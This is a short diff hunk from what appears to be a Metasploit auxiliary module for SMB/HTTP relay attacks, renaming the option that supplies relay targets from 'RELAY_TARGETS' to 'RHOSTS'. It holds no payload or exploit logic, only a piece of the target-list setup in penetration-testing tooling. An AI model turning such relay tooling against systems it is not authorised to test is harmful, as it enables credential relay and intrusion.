@@ -46,7 +46,7 @@ class MetasploitModule < Msf::Auxiliary
     Msf::Exploit::Remote::SMB::Relay::TargetList.new(
       (datastore['SSL'] ? :https : :http),
       datastore['RPORT'],
-      datastore['RELAY_TARGETS'],
+      datastore['RHOSTS'],
       datastore['TARGETURI'],
       randomize_targets: datastore['RANDOMIZE_TARGETS']
     )
